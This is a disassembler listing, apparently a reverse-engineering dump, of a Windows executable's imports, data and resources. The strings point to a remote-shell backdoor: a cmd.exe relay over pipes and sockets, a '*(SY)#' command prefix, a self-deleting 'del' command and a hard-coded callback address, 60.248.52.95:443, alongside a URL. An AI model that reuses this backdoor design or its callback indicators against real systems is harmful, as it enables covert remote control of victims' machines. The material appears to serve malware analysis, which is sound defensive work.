        004023c4 8c 00           dw         8Ch
        004023c6 44 75 70        ds         "DuplicateHandle"
                 6c 69 63
                 61 74 65
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        004023d6 3a 01           dw         13Ah
        004023d8 47 65 74        ds         "GetCurrentProcess"
                 43 75 72
                 72 65 6e
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        004023ea ab 02           dw         2ABh
        004023ec 52 65 61        ds         "ReadFile"
                 64 46 69
                 6c 65 00
        004023f5 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        004023f6 87 02           dw         287h
        004023f8 50 65 65        ds         "PeekNamedPipe"
                 6b 4e 61
                 6d 65 64
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402406 0b 03           dw         30Bh
        00402408 53 65 74        ds         "SetEvent"
                 45 76 65
                 6e 74 00
        00402411 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402412 97 03           dw         397h
        00402414 57 72 69        ds         "WriteFile"
                 74 65 46
                 69 6c 65 00
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        0040241e 28 03           dw         328h
        00402420 53 65 74        ds         "SetProcessPriorityBoost"
                 50 72 6f
                 63 65 73
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402438 38 03           dw         338h
        0040243a 53 65 74        ds         "SetThreadPriority"
                 54 68 72
                 65 61 64
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        0040244c 3d 01           dw         13Dh
        0040244e 47 65 74        ds         "GetCurrentThread"
                 43 75 72
                 72 65 6e
        0040245f 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402460 26 03           dw         326h
        00402462 53 65 74        ds         "SetPriorityClass"
                 50 72 69
                 6f 72 69
        00402473 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402474 b0 03           dw         3B0h
        00402476 6c 73 74        ds         "lstrcatA"
                 72 63 61
                 74 41 00
        0040247f 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402480 b9 03           dw         3B9h
        00402482 6c 73 74        ds         "lstrcpyA"
                 72 63 70
                 79 41 00
        0040248b 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        0040248c 50 01           dw         150h
        0040248e 47 65 74        ds         "GetEnvironmentVariableA"
                 45 6e 76
                 69 72 6f
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        004024a6 ad 01           dw         1ADh
        004024a8 47 65 74        ds         "GetShortPathNameA"
                 53 68 6f
                 72 74 50
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        004024ba 75 01           dw         175h
        004024bc 47 65 74        ds         "GetModuleFileNameA"
                 4d 6f 64
                 75 6c 65
        004024cf 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_DESCRIPTOR - DLL NAME                         *
                             **************************************************************
        004024d0 4b 45 52        ds         "KERNEL32.dll"
                 4e 45 4c
                 33 32 2e
        004024dd 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        004024de ca 01           dw         1CAh
        004024e0 4c 6f 61        ds         "LoadStringA"
                 64 53 74
                 72 69 6e
                             **************************************************************
                             * IMAGE_IMPORT_DESCRIPTOR - DLL NAME                         *
                             **************************************************************
        004024ec 55 53 45        ds         "USER32.dll"
                 52 33 32
                 2e 64 6c
        004024f7 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        004024f8 7e 00           dw         7Eh
        004024fa 53 48 43        ds         "SHChangeNotify"
                 68 61 6e
                 67 65 4e
        00402509 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        0040250a 09 01           dw         109h
        0040250c 53 68 65        ds         "ShellExecuteExA"
                 6c 6c 45
                 78 65 63
                             **************************************************************
                             * IMAGE_IMPORT_DESCRIPTOR - DLL NAME                         *
                             **************************************************************
        0040251c 53 48 45        ds         "SHELL32.dll"
                 4c 4c 33
                 32 2e 64
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402528 a5 00           dw         A5h
        0040252a 5f 62 65        ds         "_beginthread"
                 67 69 6e
                 74 68 72
        00402537 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402538 c5 01           dw         1C5h
        0040253a 5f 73 74        ds         "_strnicmp"
                 72 6e 69
                 63 6d 70 00
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402544 b2 02           dw         2B2h
        00402546 73 70 72        ds         "sprintf"
                 69 6e 74
                 66 00
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        0040254e 3e 02           dw         23Eh
        00402550 61 74 6f        ds         "atol"
                 6c 00
        00402555 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402556 b7 02           dw         2B7h
        00402558 73 74 72        ds         "strchr"
                 63 68 72 00
        0040255f 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402560 5e 02           dw         25Eh
        00402562 66 72 65        ds         "free"
                 65 00
        00402567 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402568 91 02           dw         291h
        0040256a 6d 61 6c        ds         "malloc"
                 6c 6f 63 00
        00402571 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_DESCRIPTOR - DLL NAME                         *
                             **************************************************************
        00402572 4d 53 56        ds         "MSVCRT.dll"
                 43 52 54
                 2e 64 6c
        0040257d 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        0040257e d3 00           dw         D3h
        00402580 5f 65 78        ds         "_exit"
                 69 74 00
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402586 48 00           dw         48h
        00402588 5f 58 63        ds         "_XcptFilter"
                 70 74 46
                 69 6c 74
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402594 49 02           dw         249h
        00402596 65 78 69        ds         "exit"
                 74 00
        0040259b 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        0040259c 8f 00           dw         8Fh
        0040259e 5f 61 63        ds         "_acmdln"
                 6d 64 6c
                 6e 00
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        004025a6 58 00           dw         58h
        004025a8 5f 5f 67        ds         "__getmainargs"
                 65 74 6d
                 61 69 6e
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        004025b6 0f 01           dw         10Fh
        004025b8 5f 69 6e        ds         "_initterm"
                 69 74 74
                 65 72 6d 00
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        004025c2 83 00           dw         83h
        004025c4 5f 5f 73        ds         "__setusermatherr"
                 65 74 75
                 73 65 72
        004025d5 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        004025d6 9d 00           dw         9Dh
        004025d8 5f 61 64        ds         "_adjust_fdiv"
                 6a 75 73
                 74 5f 66
        004025e5 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        004025e6 6a 00           dw         6Ah
        004025e8 5f 5f 70        ds         "__p__commode"
                 5f 5f 63
                 6f 6d 6d
        004025f5 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        004025f6 6f 00           dw         6Fh
        004025f8 5f 5f 70        ds         "__p__fmode"
                 5f 5f 66
                 6d 6f 64
        00402603 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402604 81 00           dw         81h
        00402606 5f 5f 73        ds         "__set_app_type"
                 65 74 5f
                 61 70 70
        00402615 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402616 ca 00           dw         CAh
        00402618 5f 65 78        ds         "_except_handler3"
                 63 65 70
                 74 5f 68
        00402629 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        0040262a b7 00           dw         B7h
        0040262c 5f 63 6f        ds         "_controlfp"
                 6e 74 72
                 6f 6c 66
        00402637 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_DESCRIPTOR - DLL NAME                         *
                             **************************************************************
        00402638 57 53 32        ds         "WS2_32.dll"
                 5f 33 32
                 2e 64 6c
        00402643 00              ??         00h
        00402644 75 72 6c        ds         "urlmon.dll"
                 6d 6f 6e
                 2e 64 6c
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402650 77 01           dw         177h
        00402652 47 65 74        ds         "GetModuleHandleA"
                 4d 6f 64
                 75 6c 65
        00402663 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402664 af 01           dw         1AFh
        00402666 47 65 74        ds         "GetStartupInfoA"
                 53 74 61
                 72 74 75
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402676 34 01           dw         134h
        00402678 5f 69 74        ds         "_itoa"
                 6f 61 00
        0040267e 00              ??         00h
        0040267f 00              ??         00h
        00402680 00              ??         00h
        00402681 00              ??         00h
        00402682 00              ??         00h
        00402683 00              ??         00h
        00402684 00              ??         00h
        00402685 00              ??         00h
        00402686 00              ??         00h
        00402687 00              ??         00h
        00402688 00              ??         00h
        00402689 00              ??         00h
        0040268a 00              ??         00h
        0040268b 00              ??         00h
        0040268c 00              ??         00h
        0040268d 00              ??         00h
        0040268e 00              ??         00h
        0040268f 00              ??         00h
        00402690 00              ??         00h
        00402691 00              ??         00h
        00402692 00              ??         00h
        00402693 00              ??         00h
        00402694 00              ??         00h
        00402695 00              ??         00h
        00402696 00              ??         00h
        00402697 00              ??         00h
        00402698 00              ??         00h
        00402699 00              ??         00h
        0040269a 00              ??         00h
        0040269b 00              ??         00h
        0040269c 00              ??         00h
        0040269d 00              ??         00h
        0040269e 00              ??         00h
        0040269f 00              ??         00h
        004026a0 00              ??         00h
        004026a1 00              ??         00h
        004026a2 00              ??         00h
        004026a3 00              ??         00h
        004026a4 00              ??         00h
        004026a5 00              ??         00h
        004026a6 00              ??         00h
        004026a7 00              ??         00h
        004026a8 00              ??         00h
        004026a9 00              ??         00h
        004026aa 00              ??         00h
        004026ab 00              ??         00h
        004026ac 00              ??         00h
        004026ad 00              ??         00h
        004026ae 00              ??         00h

        004027fd 00              ??         00h
        004027fe 00              ??         00h
        004027ff 00              ??         00h
                             //
                             // .data
                             // ram:00403000-ram:00403627
                             //
                             DAT_00403000                                    XREF[2]:     00400234(*), entry:00401d9a(*)
        00403000 00              ??         00h
        00403001 00              ??         00h
        00403002 00              ??         00h
        00403003 00              ??         00h
                             DAT_00403004                                    XREF[1]:     entry:00401d95(*)
        00403004 00              ??         00h
        00403005 00              ??         00h
        00403006 00              ??         00h
        00403007 00              ??         00h
                             DAT_00403008                                    XREF[1]:     entry:00401d67(*)
        00403008 00              ??         00h
        00403009 00              ??         00h
        0040300a 00              ??         00h
        0040300b 00              ??         00h
                             DAT_0040300c                                    XREF[1]:     entry:00401d62(*)
        0040300c 00              ??         00h
        0040300d 00              ??         00h
        0040300e 00              ??         00h
        0040300f 00              ??         00h
        00403010 1c              ??         1Ch                                              ?  ->  0040301c
        00403011 30              ??         30h    0
        00403012 40              ??         40h    @
        00403013 00              ??         00h
        00403014 11              ??         11h
        00403015 3a              ??         3Ah    :
        00403016 6d              ??         6Dh    m
        00403017 d2              ??         D2h
        00403018 27              ??         27h    '
        00403019 e9              ??         E9h
        0040301a b9              ??         B9h
        0040301b 31 68 74        ds         "1http://www.ueopen.com/test.html"
                 74 70 3a
                 2f 2f 77
        0040303c 00              ??         00h
        0040303d 00              ??         00h
        0040303e 00              ??         00h
        0040303f 00              ??         00h
                             **************************************************************
                             * _Str2 parameter of _strnicmp                               *
                             *                                                            *
                             **************************************************************
                             s_*(SY)#_cmd_00403040                           XREF[1]:     FUN_00401320:00401598(*)
        00403040 2a 28 53        ds         "*(SY)# cmd"
                 59 29 23
                 20 63 6d
        0040304b 00              ??         00h
                             **************************************************************
                             * _Str2 parameter of _strnicmp                               *
                             *                                                            *
                             **************************************************************
                             s_*(SY)#_0040304c                               XREF[1]:     FUN_00401320:00401580(*)
        0040304c 2a 28 53        ds         "*(SY)#"
                 59 29 23 00
        00403053 00              ??         00h
                             **************************************************************
                             * _Format parameter of sprintf                               *
                             *                                                            *
                             **************************************************************
                             s_send_=_%d_00403054                            XREF[2]:     FUN_00401320:00401521(*),
                                                                                          FUN_00401320:00401531(*)
        00403054 73 65 6e        ds         "send = %d"
                 64 20 3d
                 20 25 64 00
        0040305e 00              ??         00h
        0040305f 00              ??         00h
                             s_*(SY)#_00403060                               XREF[4]:     FUN_00401320:00401491(*),
                                                                                          FUN_00401320:0040149c(R),
                                                                                          FUN_00401320:004014af(R),
                                                                                          FUN_00401320:004014b8(R)
        00403060 2a 28 53        ds         "*(SY)# "
                 59 29 23
                 20 00
                             s_cmd.exe_00403068                              XREF[1]:     FUN_00401860:004018d3(*)
        00403068 63 6d 64        ds         "cmd.exe"
                 2e 65 78
                 65 00
        00403070 65              ??         65h    e
        00403071 78              ??         78h    x
        00403072 69              ??         69h    i
        00403073 74              ??         74h    t
        00403074 0d              ??         0Dh
        00403075 0a              ??         0Ah
        00403076 00              ??         00h
        00403077 00              ??         00h
                             DAT_00403078                                    XREF[1]:     FUN_00401b50:00401c16(*)
        00403078 4f              ??         4Fh    O
        00403079 70              ??         70h    p
        0040307a 65              ??         65h    e
        0040307b 6e              ??         6Eh    n
        0040307c 00              ??         00h
        0040307d 00              ??         00h
        0040307e 00              ??         00h
        0040307f 00              ??         00h
                             **************************************************************
                             * lpString2 parameter of lstrcatA                            *
                             *                                                            *
                             **************************************************************
                             s_>_nul_00403080                                XREF[1]:     FUN_00401b50:00401be1(*)
        00403080 20 3e 20        ds         " > nul"
                 6e 75 6c 00
        00403087 00              ??         00h
                             **************************************************************
                             * lpString2 parameter of lstrcpyA                            *
                             *                                                            *
                             **************************************************************
                             s_/c_del_00403088                               XREF[1]:     FUN_00401b50:00401bb9(*)
        00403088 2f 63 20        ds         "/c del "
                 64 65 6c
                 20 00
                             **************************************************************
                             * lpName parameter of GetEnvironmentVariableA                *
                             *                                                            *
                             **************************************************************
                             s_COMSPEC_00403090                              XREF[1]:     FUN_00401b50:00401b9f(*)
        00403090 43 4f 4d        ds         "COMSPEC"
                 53 50 45
                 43 00
                             DAT_00403098                                    XREF[1]:     entry:00401d49(R)
        00403098 01 00 00 00     undefined4 00000001h
        0040309c 00              ??         00h
        0040309d 00              ??         00h
        0040309e 00              ??         00h
        0040309f 00              ??         00h
                             **************************************************************
                             * lpBuffer parameter of LoadStringA                          *
                             *                                                            *
                             * _Str parameter of strchr                                   *
                             *                                                            *
                             **************************************************************
                             _Str_004030a0+1                                 XREF[9,1]:   FUN_00401240:00401249(*),
                             lpBuffer_004030a0                                            FUN_00401240:00401257(*),
                             _Str_004030a0                                                FUN_00401320:0040132c(*),
                                                                                          FUN_00401320:0040133a(*),
                                                                                          FUN_00401320:00401353(*),
                                                                                          FUN_00401320:00401361(R),
                                                                                          FUN_00401320:00401368(R),
                                                                                          FUN_00401320:0040136e(*),
                                                                                          FUN_00401320:0040138c(*),
                                                                                          FUN_00401320:00401385(*)
        004030a0 00 00 00 00     LPSTR      00000000
        004030a4 00              ??         00h
        004030a5 00              ??         00h
        004030a6 00              ??         00h
        004030a7 00              ??         00h
        004030a8 00              ??         00h
        004030a9 00              ??         00h
        004030aa 00              ??         00h
        004030ab 00              ??         00h
        004030ac 00              ??         00h
        004030ad 00              ??         00h
        004030ae 00              ??         00h
        004030af 00              ??         00h
        004030b0 00              ??         00h
        004030b1 00              ??         00h
        004030b2 00              ??         00h
        004030b3 00              ??         00h
        004030b4 00              ??         00h
        004030b5 00              ??         00h
        004030b6 00              ??         00h
        004030b7 00              ??         00h
        004030b8 00              ??         00h
        004030b9 00              ??         00h
        004030ba 00              ??         00h
        004030bb 00              ??         00h
        004030bc 00              ??         00h
        004030bd 00              ??         00h
        004030be 00              ??         00h
        004030bf 00              ??         00h
        004030c0 00              ??         00h
        004030c1 00              ??         00h
        004030c2 00              ??         00h
        004030c3 00              ??         00h
        004030c4 00              ??         00h
        004030c5 00              ??         00h
        004030c6 00              ??         00h
        004030c7 00              ??         00h
        004030c8 00              ??         00h
        004030c9 00              ??         00h
        004030ca 00              ??         00h
        004030cb 00              ??         00h
        004030cc 00              ??         00h
        004030cd 00              ??         00h
        004030ce 00              ??         00h
        004030cf 00              ??         00h
        004030d0 00              ??         00h
        004030d1 00              ??         00h
        004030d2 00              ??         00h
        004030d3 00              ??         00h
                             DAT_004030d4                                    XREF[1]:     FUN_004012c0:004012e1(W)
        004030d4 00              ??         00h
        004030d5 00              ??         00h
        004030d6 00              ??         00h
        004030d7 00              ??         00h
                             DAT_004030d8                                    XREF[3]:     FUN_004012c0:004012da(W),
                                                                                          FUN_004012c0:004012fe(R),
                                                                                          FUN_004012c0:00401310(R)
        004030d8 00 00 00 00     undefined4 00000000h
        004030dc 00              ??         00h
        004030dd 00              ??         00h
        004030de 00              ??         00h
        004030df 00              ??         00h
                             DAT_004030e0                                    XREF[2]:     FUN_004012c0:004012ed(*),
                                                                                          FUN_004012c0:004012f2(W)
        004030e0 00 00 00 00     undefined4 00000000h
        004030e4 00              ??         00h
        004030e5 00              ??         00h

        00403608 00              ??         00h
        00403609 00              ??         00h
        0040360a 00              ??         00h
        0040360b 00              ??         00h
                             **************************************************************
                             * _DoWildCard parameter of __getmainargs                     *
                             *                                                            *
                             **************************************************************
                             _DoWildCard_0040360c                            XREF[1]:     entry:00401d7d(R)
        0040360c 00 00 00 00     int        0h
                             DAT_00403610                                    XREF[1]:     entry:00401d71(R)
        00403610 00 00 00 00     undefined4 00000000h
                             DAT_00403614                                    XREF[1]:     entry:00401d30(R)
        00403614 00 00 00 00     undefined4 00000000h
                             DAT_00403618                                    XREF[1]:     entry:00401d22(R)
        00403618 00 00 00 00     undefined4 00000000h
                             DAT_0040361c                                    XREF[1]:     entry:00401d0e(RW)
        0040361c 00              ??         00h
        0040361d 00              ??         00h
        0040361e 00              ??         00h
        0040361f 00              ??         00h
                             DAT_00403620                                    XREF[1]:     entry:00401d15(RW)
        00403620 00              ??         00h
        00403621 00              ??         00h
        00403622 00              ??         00h
        00403623 00              ??         00h
                             DAT_00403624                                    XREF[1]:     entry:00401d3f(W)
        00403624 00              ??         00h
        00403625 00              ??         00h
        00403626 00              ??         00h
        00403627 00              ??         00h
                             //
                             // .rsrc
                             // ram:00404000-ram:004041ff
                             //
                             IMAGE_RESOURCE_DIRECTORY_00404000               XREF[2]:     00400168(*), 0040025c(*)
        00404000 00 00 00        IMAGE_RE
                 00 00 00
                 00 00 04
        00404010 06 00 00        IMAGE_RE
                 00 18 00
                 00 80
        00404018 00 00 00        IMAGE_RE
                 00 00 00
                 00 00 04
        00404028 01 00 00        IMAGE_RE
                 00 30 00
                 00 80
        00404030 00 00 00        IMAGE_RE
                 00 00 00
                 00 00 04
        00404040 09 04 00        IMAGE_RE
                 00 48 00
                 00 00
        00404048 58 40 00        IMAGE_RE
                 00 24 00
                 00 00 e4
                             Rsrc_StringTable_1_409
        00404058 00 00           p_unicode  u""                                              Rsrc String ID 0
        0040405a 10 00 36        p_unicode  u"60.248.52.95:443"                              Rsrc String ID 1
                 00 30 00
                 2e 00 32
        0040407c 50              ??         50h    P                                         Rsrc String ID 2
        0040407d 41              ??         41h    A                                         Rsrc String ID 3
        0040407e 44              ??         44h    D                                         Rsrc String ID 4
        0040407f 44              ??         44h    D                                         Rsrc String ID 5
        00404080 49              ??         49h    I                                         Rsrc String ID 6
        00404081 4e              ??         4Eh    N                                         Rsrc String ID 7
        00404082 47              ??         47h    G                                         Rsrc String ID 8
        00404083 58              ??         58h    X                                         Rsrc String ID 9
        00404084 58              ??         58h    X                                         Rsrc String ID 10
        00404085 50              ??         50h    P                                         Rsrc String ID 11
        00404086 41              ??         41h    A                                         Rsrc String ID 12
        00404087 44              ??         44h    D                                         Rsrc String ID 13
        00404088 44              ??         44h    D                                         Rsrc String ID 14
        00404089 49              ??         49h    I                                         Rsrc String ID 15
                             **************************************************************
                             * Rsrc_StringTable_1_409 Size of resource: 0x24 bytes        *
                             **************************************************************
        0040408a 4e              ??         4Eh    N
        0040408b 47              ??         47h    G
        0040408c 50              ??         50h    P
        0040408d 41              ??         41h    A
        0040408e 44              ??         44h    D
        0040408f 44              ??         44h    D
        00404090 49              ??         49h    I
        00404091 4e              ??         4Eh    N
        00404092 47              ??         47h    G
        00404093 58              ??         58h    X
        00404094 58              ??         58h    X
        00404095 50              ??         50h    P
        00404096 41              ??         41h    A
        00404097 44              ??         44h    D
        00404098 44              ??         44h    D
        00404099 49              ??         49h    I
        0040409a 4e              ??         4Eh    N
        0040409b 47              ??         47h    G
        0040409c 50              ??         50h    P
        0040409d 41              ??         41h    A
        0040409e 44              ??         44h    D
        0040409f 44              ??         44h    D
        004040a0 49              ??         49h    I
        004040a1 4e              ??         4Eh    N
        004040a2 47              ??         47h    G
        004040a3 58              ??         58h    X
        004040a4 58              ??         58h    X
        004040a5 50              ??         50h    P
        004040a6 41              ??         41h    A
        004040a7 44              ??         44h    D
        004040a8 44              ??         44h    D
        004040a9 49              ??         49h    I
        004040aa 4e              ??         4Eh    N
        004040ab 47              ??         47h    G
        004040ac 50              ??         50h    P
        004040ad 41              ??         41h    A
        004040ae 44              ??         44h    D
        004040af 44              ??         44h    D
        004040b0 49              ??         49h    I
        004040b1 4e              ??         4Eh    N
        004040b2 47              ??         47h    G
        004040b3 58              ??         58h    X
        004040b4 58              ??         58h    X
        004040b5 50              ??         50h    P
        004040b6 41              ??         41h    A
        004040b7 44              ??         44h    D
        004040b8 44              ??         44h    D
        004040b9 49              ??         49h    I
        004040ba 4e              ??         4Eh    N
        004040bb 47              ??         47h    G
        004040bc 50              ??         50h    P
        004040bd 41              ??         41h    A
        004040be 44              ??         44h    D
        004040bf 44              ??         44h    D
        004040c0 49              ??         49h    I
        004040c1 4e              ??         4Eh    N
        004040c2 47              ??         47h    G
        004040c3 58              ??         58h    X
        004040c4 58              ??         58h    X
        004040c5 50              ??         50h    P
        004040c6 41              ??         41h    A
        004040c7 44              ??         44h    D
        004040c8 44              ??         44h    D
        004040c9 49              ??         49h    I
        004040ca 4e              ??         4Eh    N
        004040cb 47              ??         47h    G
        004040cc 50              ??         50h    P
        004040cd 41              ??         41h    A
        004040ce 44              ??         44h    D
        004040cf 44              ??         44h    D
        004040d0 49              ??         49h    I
        004040d1 4e              ??         4Eh    N
        004040d2 47              ??         47h    G
        004040d3 58              ??         58h    X
        004040d4 58              ??         58h    X
        004040d5 50              ??         50h    P
        004040d6 41              ??         41h    A
        004040d7 44              ??         44h    D
        004040d8 44              ??         44h    D
        004040d9 49              ??         49h    I
        004040da 4e              ??         4Eh    N
        004040db 47              ??         47h    G
        004040dc 50              ??         50h    P
        004040dd 41              ??         41h    A
        004040de 44              ??         44h    D
        004040df 44              ??         44h    D
        004040e0 49              ??         49h    I
        004040e1 4e              ??         4Eh    N
        004040e2 47              ??         47h    G
        004040e3 58              ??         58h    X
        004040e4 58              ??         58h    X
        004040e5 50              ??         50h    P
        004040e6 41              ??         41h    A
        004040e7 44              ??         44h    D
        004040e8 44              ??         44h    D
        004040e9 49              ??         49h    I
        004040ea 4e              ??         4Eh    N
        004040eb 47              ??         47h    G
        004040ec 50              ??         50h    P
        004040ed 41              ??         41h    A
        004040ee 44              ??         44h    D
        004040ef 44              ??         44h    D
        004040f0 49              ??         49h    I
        004040f1 4e              ??         4Eh    N
        004040f2 47              ??         47h    G
        004040f3 58              ??         58h    X
        004040f4 58              ??         58h    X
        004040f5 50              ??         50h    P
        004040f6 41              ??         41h    A
        004040f7 44              ??         44h    D
        004040f8 44              ??         44h    D
        004040f9 49              ??         49h    I
        004040fa 4e              ??         4Eh    N
        004040fb 47              ??         47h    G
        004040fc 50              ??         50h    P
        004040fd 41              ??         41h    A
        004040fe 44              ??         44h    D
        004040ff 44              ??         44h    D
        00404100 49              ??         49h    I
        00404101 4e              ??         4Eh    N
        00404102 47              ??         47h    G
        00404103 58              ??         58h    X
        00404104 58              ??         58h    X
        00404105 50              ??         50h    P
        00404106 41              ??         41h    A
        00404107 44              ??         44h    D
        00404108 44              ??         44h    D
        00404109 49              ??         49h    I
        0040410a 4e              ??         4Eh    N
        0040410b 47              ??         47h    G
        0040410c 50              ??         50h    P
        0040410d 41              ??         41h    A
        0040410e 44              ??         44h    D
        0040410f 44              ??         44h    D
        00404110 49              ??         49h    I
        00404111 4e              ??         4Eh    N
        00404112 47              ??         47h    G
        00404113 58              ??         58h    X
        00404114 58              ??         58h    X
        00404115 50              ??         50h    P
        00404116 41              ??         41h    A
        00404117 44              ??         44h    D
        00404118 44              ??         44h    D
        00404119 49              ??         49h    I
        0040411a 4e              ??         4Eh    N
        0040411b 47              ??         47h    G
        0040411c 50              ??         50h    P
        0040411d 41              ??         41h    A
        0040411e 44              ??         44h    D
        0040411f 44              ??         44h    D
        00404120 49              ??         49h    I
        00404121 4e              ??         4Eh    N
        00404122 47              ??         47h    G
        00404123 58              ??         58h    X
        00404124 58              ??         58h    X
        00404125 50              ??         50h    P
        00404126 41              ??         41h    A
        00404127 44              ??         44h    D
        00404128 44              ??         44h    D
        00404129 49              ??         49h    I
        0040412a 4e              ??         4Eh    N
        0040412b 47              ??         47h    G
        0040412c 50              ??         50h    P
        0040412d 41              ??         41h    A
        0040412e 44              ??         44h    D
        0040412f 44              ??         44h    D
        00404130 49              ??         49h    I
        00404131 4e              ??         4Eh    N
        00404132 47              ??         47h    G
        00404133 58              ??         58h    X
        00404134 58              ??         58h    X
        00404135 50              ??         50h    P
        00404136 41              ??         41h    A
        00404137 44              ??         44h    D
        00404138 44              ??         44h    D
        00404139 49              ??         49h    I
        0040413a 4e              ??         4Eh    N
        0040413b 47              ??         47h    G
        0040413c 50              ??         50h    P
        0040413d 41              ??         41h    A
        0040413e 44              ??         44h    D
        0040413f 44              ??         44h    D
        00404140 49              ??         49h    I
        00404141 4e              ??         4Eh    N
        00404142 47              ??         47h    G
        00404143 58              ??         58h    X
        00404144 58              ??         58h    X
        00404145 50              ??         50h    P
        00404146 41              ??         41h    A
        00404147 44              ??         44h    D
        00404148 44              ??         44h    D
        00404149 49              ??         49h    I
        0040414a 4e              ??         4Eh    N
        0040414b 47              ??         47h    G
        0040414c 50              ??         50h    P
        0040414d 41              ??         41h    A
        0040414e 44              ??         44h    D
        0040414f 44              ??         44h    D
        00404150 49              ??         49h    I
        00404151 4e              ??         4Eh    N
        00404152 47              ??         47h    G
        00404153 58              ??         58h    X
        00404154 58              ??         58h    X
        00404155 50              ??         50h    P
        00404156 41              ??         41h    A
        00404157 44              ??         44h    D
        00404158 44              ??         44h    D
        00404159 49              ??         49h    I
        0040415a 4e              ??         4Eh    N
        0040415b 47              ??         47h    G
        0040415c 50              ??         50h    P
        0040415d 41              ??         41h    A
        0040415e 44              ??         44h    D
        0040415f 44              ??         44h    D
        00404160 49              ??         49h    I
        00404161 4e              ??         4Eh    N
        00404162 47              ??         47h    G
        00404163 58              ??         58h    X
        00404164 58              ??         58h    X
        00404165 50              ??         50h    P
        00404166 41              ??         41h    A
        00404167 44              ??         44h    D
        00404168 44              ??         44h    D
        00404169 49              ??         49h    I
        0040416a 4e              ??         4Eh    N
        0040416b 47              ??         47h    G
        0040416c 50              ??         50h    P
        0040416d 41              ??         41h    A
        0040416e 44              ??         44h    D
        0040416f 44              ??         44h    D
        00404170 49              ??         49h    I
        00404171 4e              ??         4Eh    N
        00404172 47              ??         47h    G
        00404173 58              ??         58h    X
        00404174 58              ??         58h    X
        00404175 50              ??         50h    P
        00404176 41              ??         41h    A
        00404177 44              ??         44h    D
        00404178 44              ??         44h    D
        00404179 49              ??         49h    I
        0040417a 4e              ??         4Eh    N
        0040417b 47              ??         47h    G
        0040417c 50              ??         50h    P
        0040417d 41              ??         41h    A
        0040417e 44              ??         44h    D
        0040417f 44              ??         44h    D
        00404180 49              ??         49h    I
        00404181 4e              ??         4Eh    N
        00404182 47              ??         47h    G
        00404183 58              ??         58h    X
        00404184 58              ??         58h    X
        00404185 50              ??         50h    P
        00404186 41              ??         41h    A
        00404187 44              ??         44h    D
        00404188 44              ??         44h    D
        00404189 49              ??         49h    I
        0040418a 4e              ??         4Eh    N
        0040418b 47              ??         47h    G
        0040418c 50              ??         50h    P
        0040418d 41              ??         41h    A
        0040418e 44              ??         44h    D
        0040418f 44              ??         44h    D
        00404190 49              ??         49h    I
        00404191 4e              ??         4Eh    N
        00404192 47              ??         47h    G
        00404193 58              ??         58h    X
        00404194 58              ??         58h    X
        00404195 50              ??         50h    P
